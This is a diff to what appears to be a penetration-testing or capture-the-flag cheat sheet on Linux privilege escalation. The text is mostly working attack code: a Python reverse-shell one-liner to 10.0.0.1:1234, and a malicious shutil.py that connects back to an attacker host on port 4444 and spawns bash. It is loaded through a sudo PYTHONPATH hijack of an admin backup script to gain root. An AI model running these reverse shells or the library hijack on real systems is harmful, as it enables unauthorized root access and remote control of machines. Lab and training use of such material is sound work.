@@ -117,16 +117,27 @@ socket.SOCK_STREAM); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);
 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);'
 ```
-or 
+یا 
 
 ```text
-create file as shutil.py contains:
+check sudoer script content like:
+
+#!/usr/bin/python3
+from shutil import make_archive
+src = '/var/www/html/'
+# old ftp directory, not used anymore
+#dst = '/srv/ftp/html'
+dst = '/var/backups/html'
+make_archive(dst, 'gztar', src)
+You have new mail in /var/mail/waldo
+
+and create file for got root as shutil.py contains:
 
 import os
 import pty
 import socket
 
-lhost = "10.10.14.174"
+lhost = "10.10.10.10"
 lport = 4444
 
 ZIP_DEFLATED = 0
@@ -146,7 +157,7 @@ os.putenv("HISTFILE",'/dev/null')
 pty.spawn("/bin/bash")
 s.close()
 
-and run script with 
+and run sudoer script with 
 
 sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
 ```
